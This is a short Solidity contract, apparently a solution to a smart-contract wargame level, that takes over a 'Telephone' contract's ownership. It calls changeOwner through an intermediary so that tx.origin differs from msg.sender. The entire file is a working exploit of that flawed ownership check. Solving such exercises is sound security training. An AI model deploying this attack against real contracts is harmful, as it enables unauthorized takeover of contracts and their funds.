pragma solidity ^0.4.18;

import "Telephone.sol";

contract TelephoneAttack {
    
    Telephone public tele;
    
    function TelephoneAttack(address _add) public {
        tele = Telephone(_add);
    }
    
    function go() public {
        tele.changeOwner(tx.origin);
    }
}